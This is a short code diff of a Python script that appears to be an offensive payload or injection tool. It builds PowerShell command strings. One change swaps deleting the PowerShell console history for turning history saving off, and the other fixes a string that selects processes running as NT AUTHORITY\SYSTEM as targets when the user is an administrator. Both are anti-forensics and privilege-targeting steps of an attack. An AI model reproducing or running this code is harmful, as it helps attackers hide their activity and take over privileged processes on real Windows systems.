@@ -71,7 +71,7 @@ if __name__ == '__main__':
 	else:
 		payloadfile = "payload.txt"
 	if args.execution_method == "ps":
-		remhistory = "Remove-Item \"$Env:APPDATA\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue"
+		remhistory = "Set-PSReadLineOption -HistorySaveStyle SaveNothing"
 	elif args.execution_method == "cmd":
 		remhistory = ""
 		stager = True
@@ -87,7 +87,7 @@ if __name__ == '__main__':
 		tgt_proc = args.process
 	# If admin, get procs owned by SYSTEM, else get ones which you can read the path which means you have some kind of permission on it
 	low_priv_procs =  "$procs=(Get-Process "+tgt_proc+" | Where-Object {$_.Path -ne $null})"
-	high_priv_procs = "$procs=(Get-Process "+tgt_proc+" -IncludeUserName | Where-Object {$_.UserName -eq \"NT AUTHORITY\SYSTEM\"}); if($procs.Length -eq 0){"+low_priv_procs+"}"
+	high_priv_procs = "$procs=(Get-Process " + tgt_proc + " -IncludeUserName | Where-Object {$_.UserName -eq " + '"NT AUTHORITY\\SYSTEM"' + "}); if($procs.Length -eq 0){" + low_priv_procs + "}"
 	pidfinder = "if($isBoss){"+high_priv_procs+"} else{"+low_priv_procs+"}"
 	
 	if args.key:
